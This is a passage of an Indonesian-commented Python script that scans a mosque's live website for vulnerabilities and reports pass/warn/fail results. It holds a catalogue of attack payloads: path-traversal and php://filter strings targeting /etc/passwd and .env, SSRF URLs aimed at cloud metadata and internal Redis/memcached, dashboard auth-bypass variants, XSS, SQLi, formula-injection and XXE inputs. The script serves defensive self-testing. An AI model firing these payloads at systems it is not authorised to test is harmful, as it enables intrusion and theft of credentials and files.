        report.add("exploit", "FAIL", f"Laravel Ignition terbuka (health-check {health.status}, execute-solution {execute.status})", "Matikan APP_DEBUG dan hapus laravel-ignition dari produksi — ini jalur RCE CVE-2021-3129")
    else:
        report.add("exploit", "PASS", "Laravel Ignition (CVE-2021-3129) tidak terbuka")

    # --- Apakah folder unggahan mengeksekusi PHP? (inti dari serangan "upload shell") ---
    marker, digest = rce_marker()
    probe_name = f"nh-uji-{secrets.token_hex(4)}.php"
    results = []
    for directory in ("storage/", "storage/galeri/seed/", "images/", "build/"):
        # Berkas ini tidak ada; kalau server menjawab 200 + mengeksekusi, konfigurasinya berbahaya.
        response = fetch(base + "/" + directory + probe_name, follow=False)
        results.append((directory, response))
    executed = [directory for directory, response in results if digest in response.text or ("<?php" not in response.text and response.status == 200 and response.body and "image" not in response.header("content-type"))]
    report.add("exploit", "PASS" if not executed else "WARN",
               "Folder unggahan/aset menolak berkas PHP tak dikenal" if not executed else "Folder berikut menjawab 200 untuk .php tak dikenal: " + ", ".join(executed))

    # --- Berkas unggahan nyata tidak boleh disajikan sebagai HTML/teks yang bisa jadi XSS ---
    sitemap = fetch(base + "/sitemap.xml")
    sample_pages = re.findall(r"<loc>([^<]+galeri/album[^<]+)</loc>", sitemap.text)[:1]
    if sample_pages:
        page = fetch(sample_pages[0])
        storage_img = re.search(r'(https?://[^"]+/storage/[^"]+\.(?:jpg|jpeg|png|webp))', page.text)
        if storage_img:
            img = fetch(storage_img.group(1), follow=False)
            ctype = img.header("content-type")
            report.add("exploit", "PASS" if ctype.startswith("image/") else "WARN",
                       f"Foto unggahan disajikan sebagai {ctype or '?'}" + ("" if ctype.startswith("image/") else " (seharusnya image/*)"))


def check_lfi_traversal(base: str, report: Report) -> None:
    report.heading("10c. Local File Inclusion dan path traversal")
    # Endpoint kalender memakai slug di URL: /agenda/{slug}/kalender.ics
    targets = [
        "/agenda/{p}/kalender.ics",
        "/galeri/album/{p}",
        "/galeri/artikel/{p}",
        "/{p}",
    ]
    payloads = [
        "../../../../../../etc/passwd",
        "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "....//....//....//etc/passwd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "%2e%2e%2f%2e%2e%2f.env",
        "../.env",
        "php://filter/convert.base64-encode/resource=index",
        "/etc/passwd%00.ics",
        "....\\....\\....\\windows\\win.ini",
    ]
    # Penanda isi berkas sistem — DICOCOKKAN SEBAGAI TEKS BIASA (bukan regex), agar tidak salah tangkap.
    # Penanda yang praktis mustahil muncul kecuali isi berkas aslinya benar-benar bocor.
    leak_markers = ("root:x:0:0:", "DB_PASSWORD=", "DB_USERNAME=", "APP_KEY=base64:", "; for 16-bit app support")
    source_markers = ("<?php", "<?=")
    vulnerable = 0
    checked = 0
    for template in targets:
        for payload in payloads:
            url = base + template.replace("{p}", urllib.parse.quote(payload, safe=""))
            response = fetch(url, follow=False)
            checked += 1
            text = response.text
            hit = next((marker for marker in leak_markers if marker in text), None)
            # Kode sumber hanya mencurigakan bila halaman BUKAN HTML biasa (mis. berkas PHP ter-disclosure).
            if hit is None and "<html" not in text.lower():
                hit = next((marker for marker in source_markers if marker in text), None)
            if hit is not None:
                vulnerable += 1
                report.add("exploit", "FAIL", f"Kemungkinan LFI/traversal: {template.replace('{p}', payload)}", f"status {response.status}, penanda '{hit}' terlihat di respons")
            elif response.status >= 500:
                report.add("exploit", "WARN", f"Error {response.status} untuk traversal: {template.replace('{p}', payload)[:70]}")
    if vulnerable == 0:
        report.add("exploit", "PASS", f"Tidak ada LFI/path traversal ({checked} percobaan termasuk double-encoding, null byte, dan php://filter)")


def check_ssrf(base: str, report: Report, opener=None) -> None:
    report.heading("10d. SSRF (Server-Side Request Forgery)")
    # Endpoint pencarian video mengambil URL dari sisi server.
    internal = [
        "http://169.254.169.254/latest/meta-data/",   # metadata cloud AWS
        "http://metadata.google.internal/",            # metadata GCP
        "http://127.0.0.1:3306/",                       # database lokal
        "http://localhost/server-status",
        "http://[::1]/",
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_INFO",
        "dict://127.0.0.1:11211/stat",
    ]
    lookup = base + "/dashboard/galeri/video/info-youtube"
    blocked = 0
    for target in internal:
        response = fetch(lookup + "?url=" + urllib.parse.quote(target, safe=""), follow=False, opener=opener)
        # Tanpa login → 302 ke /login; dengan login → 422 karena bukan URL YouTube.
        if response.status in (302, 401, 403, 419, 422, 404):
            blocked += 1
        elif response.status == 200 and ("ami-" in response.text or "root:x:0" in response.text or "redis_version" in response.text):
            report.add("exploit", "FAIL", f"SSRF: server mengambil {target}", response.text[:120])
    report.add("exploit", "PASS" if blocked == len(internal) else "WARN",
               f"Endpoint info-YouTube menolak {blocked}/{len(internal)} URL internal" + (" (hanya menerima tautan YouTube)" if blocked == len(internal) else ""))

    # Parameter lain yang sering rentan SSRF/open-redirect di query string.
    for param in ("url", "uri", "path", "file", "src", "dest", "callback", "webhook", "proxy", "image", "load"):
        response = fetch(base + "/?" + param + "=http://169.254.169.254/", follow=False)
        if response.status == 200 and ("ami-id" in response.text or "meta-data" in response.text):
            report.add("exploit", "FAIL", f"SSRF lewat parameter ?{param}=")


def check_auth_bypass(base: str, report: Report) -> None:
    report.heading("10e. Percobaan menembus halaman dashboard tanpa login")
    # Variasi URL yang kadang menipu pemeriksaan hak akses.
    variants = [
        "/dashboard", "/dashboard/", "/dashboard//", "/Dashboard", "/DASHBOARD",
        "/dashboard/.", "/dashboard/..;/", "/dashboard%00", "/dashboard%20",
        "/dashboard?", "/dashboard#", "/dashboard/kontak", "/dashboard/galeri",
        "/./dashboard", "/%2e/dashboard", "/dashboard/./", "//dashboard",
        "/dashboard..;", "/dashboard;/", "/dashboard%2f..%2fdashboard",
    ]
    leaked = []
    for path in variants:
        response = fetch(base + path, follow=False)
        body = response.text
        # Bocor bila tampil isi dashboard (bukan halaman masuk, bukan redirect, bukan 404).
        if response.status == 200 and ("dashboard-sidebar" in body or "Kelola situs" in body or "dashboard-content" in body):
            leaked.append(f"{path} ({response.status})")
    if leaked:
        for item in leaked:
            report.add("exploit", "FAIL", f"Dashboard bisa dibuka tanpa login lewat: {item}")
    else:
        report.add("exploit", "PASS", f"{len(variants)} variasi URL dashboard (encoding, titik, titik koma, huruf besar) semuanya diblokir")

    # Header yang kadang dipakai untuk menipu reverse proxy.
    for header in ("X-Original-URL", "X-Rewrite-URL", "X-Override-URL"):
        response = fetch(base + "/", headers={header: "/dashboard"}, follow=False)
        if response.status == 200 and ("dashboard-sidebar" in response.text or "Kelola situs" in response.text):
            report.add("exploit", "FAIL", f"Bypass lewat header {header}: /dashboard muncul di halaman depan")
    report.add("exploit", "INFO", "Header X-Original-URL / X-Rewrite-URL tidak membuka dashboard")

    # Metode HTTP tidak lazim ke /dashboard (verb tampering).
    for method in ("POST", "HEAD", "OPTIONS", "TRACE", "CONNECT", "FOO"):
        response = fetch(base + "/dashboard", method=method, follow=False, data=b"" if method in ("POST",) else None)
        if response.status == 200 and "Kelola situs" in response.text:
            report.add("exploit", "FAIL", f"Metode {method} ke /dashboard melewati login")


def check_misc_injection(base: str, report: Report) -> None:
    report.heading("10f. Celah lain (header injection, deserialisasi, iCal injection, XXE)")

    # X-Forwarded-For / User-Agent yang berisi payload — sering muncul lagi di log admin.
    marker, _ = rce_marker()
    fetch(base + "/", headers={"X-Forwarded-For": f'<svg/onload=alert(1)>{marker}', "User-Agent": f"sqlmap/1.0 {marker}' OR '1'='1"})
    report.add("exploit", "INFO", "Payload lewat X-Forwarded-For / User-Agent dikirim (pastikan log admin menampilkannya dengan di-escape)")

    # Cookie bernilai objek PHP serialized (percobaan PHP object injection).
    serialized = 'O:8:"stdClass":0:{}'
    response = fetch(base + "/", headers={"Cookie": f"nurulhaqq_session={urllib.parse.quote(serialized)}"}, follow=False)
    unserialize_leak = any(marker in response.text for marker in ("unserialize()", "__PHP_Incomplete_Class", "stdClass"))
    report.add("exploit", "PASS" if not unserialize_leak else "FAIL",
               "Cookie sesi berisi objek serialized " + ("tidak memicu kesalahan unserialize" if not unserialize_leak else "memicu unserialize (PHP object injection!)"))

    # iCal/CSV injection: slug agenda yang mengandung formula.
    response = fetch(base + "/agenda/" + urllib.parse.quote("=cmd|'/c calc'!A1") + "/kalender.ics", follow=False)
    report.add("exploit", "PASS" if response.status in (404, 400) else "INFO",
               f"Slug agenda berbahaya → {response.status}" + (" (ditolak)" if response.status in (404, 400) else ""))

    # XXE: kirim XML dengan entitas eksternal ke endpoint yang menerima body (kalau ada).
    xxe = b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'
    response = fetch(base + "/", method="POST", data=xxe, follow=False, headers={"Content-Type": "application/xml"})
    report.add("exploit", "PASS" if "root:x:0" not in response.text else "FAIL",
               "Kiriman XML dengan entitas eksternal (XXE) " + ("tidak membocorkan berkas" if "root:x:0" not in response.text else "MEMBOCORKAN /etc/passwd!"))


def check_pentest(base: str, report: Report, args) -> None:
    check_known_exploit_paths(base, report)
    check_rce(base, report)
    check_lfi_traversal(base, report)
    check_ssrf(base, report)
    check_auth_bypass(base, report)
    check_misc_injection(base, report)



def load_test(base: str, report: Report, total: int, concurrency: int) -> dict:
    report.heading(f"7. Uji beban ringan ({total} permintaan, {concurrency} paralel)")
    paths = ["/", "/jadwal-kegiatan", "/galeri", "/ziswaf", "/kontak"]
    urls = [base + paths[index % len(paths)] for index in range(total)]

    start = time.perf_counter()
    with futures.ThreadPoolExecutor(max_workers=concurrency) as pool:
        responses = list(pool.map(fetch, urls))
    elapsed = time.perf_counter() - start

    ok = [response for response in responses if response.status == 200]
    errors = len(responses) - len(ok)
    durations = sorted(response.total for response in ok)
    summary = {"requests": total, "concurrency": concurrency, "errors": errors, "seconds": round(elapsed, 2)}

    if durations:
        p50 = statistics.median(durations)
        p95 = durations[min(len(durations) - 1, int(len(durations) * 0.95))]
        summary.update({"p50_ms": round(p50 * 1000), "p95_ms": round(p95 * 1000), "max_ms": round(durations[-1] * 1000), "rps": round(len(ok) / elapsed, 1)})
        level = "PASS" if p95 <= TOTAL_WARN else "WARN" if p95 <= TOTAL_FAIL else "FAIL"
        report.add("load", level, f"p50 {fmt_ms(p50)} · p95 {fmt_ms(p95)} · maks {fmt_ms(durations[-1])} · {summary['rps']} permintaan/detik")

    statuses = sorted({response.status for response in responses if response.status != 200})
    report.add("load", "FAIL" if errors else "PASS", f"{len(ok)}/{total} permintaan berhasil", "status lain: " + ", ".join(map(str, statuses)) if errors else "")
    return summary


def main() -> int:
    parser = argparse.ArgumentParser(description="Pemeriksaan situs live Masjid Nurul Haqq.")
    parser.add_argument("url", nargs="?", default="https://masjidnurulhaqq.com", help="alamat situs (bawaan: https://masjidnurulhaqq.com)")
    parser.add_argument("--load", type=int, default=30, help="jumlah permintaan uji beban (0 = lewati)")
    parser.add_argument("--concurrency", type=int, default=5, help="permintaan paralel saat uji beban")
    parser.add_argument("--link-limit", type=int, default=80, help="batas tautan internal tambahan yang dicek")
    parser.add_argument("--json", help="simpan laporan lengkap ke berkas JSON")
    parser.add_argument("--no-color", action="store_true", help="matikan warna di terminal")
    parser.add_argument("--basic", action="store_true", help="lewati pemeriksaan keamanan lanjutan")
    parser.add_argument("--login-attempts", type=int, default=7, help="percobaan login salah untuk uji rate limit (0 = lewati)")
    parser.add_argument("--skip-dns", action="store_true", help="lewati pemeriksaan DNS (SPF, DMARC, CAA)")
    parser.add_argument("--crawl-limit", type=int, default=150, help="batas halaman yang dijelajahi")
    parser.add_argument("--max-fuzz", type=int, default=600, help="batas permintaan fuzzing publik")
    parser.add_argument("--delay", type=float, default=0.05, help="jeda antar permintaan fuzzing/crawl (detik)")
    parser.add_argument("--auth-email", help="email admin untuk menjelajah dashboard (password ditanya, atau env LIVE_CHECK_PASSWORD)")
    parser.add_argument("--no-pentest", action="store_true", help="lewati uji eksploitasi (RCE, webshell, LFI, SSRF, bypass auth)")
    args = parser.parse_args()

    base = args.url.rstrip("/")
    report = Report(color=not args.no_color and sys.stdout.isatty())

    print(f"Pemeriksaan {base} · {datetime.now():%d %b %Y %H:%M}")

    check_tls_and_redirects(base, report)
    pages = discover_pages(base, report)
    parsed = check_pages(base, pages, report)
    check_assets(base, parsed, report)
    check_links(base, parsed, report, args.link_limit)
    check_security(base, report)
    if not args.basic:
        check_tls_advanced(base, report)
        check_http_hardening(base, report)
        check_cookies_and_headers(base, report)
        check_input_handling(base, report)
        check_login_protection(base, report, args.login_attempts)
        if not args.skip_dns:
            check_dns(base, report)
        check_deep(base, report, args)
        if not args.no_pentest:
            check_pentest(base, report, args)
    load = load_test(base, report, args.load, args.concurrency) if args.load > 0 else {}

    passed, warned, failed = report.count("PASS"), report.count("WARN"), report.count("FAIL")
    print(f"\nRingkasan: {passed} lulus · {warned} peringatan · {failed} gagal")

    if args.json:
        with open(args.json, "w", encoding="utf-8") as handle:
            json.dump({"url": base, "checked_at": datetime.now().isoformat(), "load_test": load, "results": report.results}, handle, ensure_ascii=False, indent=2)
        print(f"Laporan JSON disimpan di {args.json}")

    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
